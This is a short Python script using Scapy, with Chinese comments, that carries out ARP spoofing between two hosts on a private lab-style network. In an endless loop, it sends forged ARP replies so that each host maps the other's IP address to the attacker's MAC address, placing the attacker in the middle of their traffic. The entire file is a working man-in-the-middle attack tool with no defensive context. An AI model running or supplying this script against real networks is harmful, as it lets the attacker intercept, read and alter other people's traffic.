from scapy.all import *
# 定义网络中设备A、B和攻击者M的IP和MAC地址
A_ip = "192.168.232.163"
A_mac = "00:0c:29:91:17:e5"
B_ip = "192.168.232.166"
B_mac = "00:0c:29:78:25:d3"
M_ip = "192.168.232.164"
M_mac = "00:0c:29:a9:b5:f8"

# 无限循环，使ARP欺骗持续进行
while True:
    # 为设备A构造伪造的ARP回复
    # 使用攻击者M的MAC地址作为源MAC地址，设备A的MAC地址作为目标MAC地址
    ethA = Ether(src=M_mac, dst=A_mac)
    # 构造ARP数据包，使得设备A认为设备B的IP对应的是攻击者M的MAC地址
    arpA = ARP(hwsrc=M_mac, psrc=B_ip, hwdst=A_mac, pdst=A_ip)
    arpA.op = 2  # ARP回复

    # 将以太网头和ARP请求合并，形成完整的数据包
    pkt1 = ethA/arpA
    # 发送数据包，count=1表示只发送一次
    sendp(pkt1, count=1)

    # 为设备B构造伪造的ARP回复
    ethB = Ether(src=M_mac, dst=B_mac)
    arpB = ARP(hwsrc=M_mac, psrc=A_ip, hwdst=B_mac, pdst=B_ip)
    arpB.op = 2  # ARP回复

    pkt2 = ethB/arpB
    sendp(pkt2, count=1)

    # 每次发送完毕后休眠2秒，然后重复这个过程
    time.sleep(2)
